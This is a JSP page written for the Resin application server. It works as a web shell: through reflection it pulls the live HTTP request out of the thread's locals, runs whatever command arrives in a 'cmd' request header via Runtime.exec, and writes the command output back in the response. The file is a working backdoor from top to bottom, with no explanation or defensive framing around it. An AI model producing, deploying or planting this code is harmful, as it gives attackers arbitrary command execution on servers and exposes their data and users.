<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = Thread.currentThread().getClass();
    java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField("threadLocals");
    field.setAccessible(true);
    Object obj = field.get(Thread.currentThread());

    field = obj.getClass().getDeclaredField("table");
    field.setAccessible(true);
    obj = field.get(obj);

    Object[] obj_arr = (Object[]) obj;
    for(Object o : obj_arr) {
        if (o == null) continue;

        field = o.getClass().getDeclaredField("value");
        field.setAccessible(true);
        obj = field.get(o);

        if(obj instanceof com.caucho.server.http.HttpRequest){
            com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;
            String cmd = httpRequest.getHeader("cmd");
            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

            com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
            java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream");
            method.setAccessible(true);
            com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse);
            httpResponseStream.write(res.getBytes(), 0, res.length());
            httpResponseStream.close();
        }
    }
%>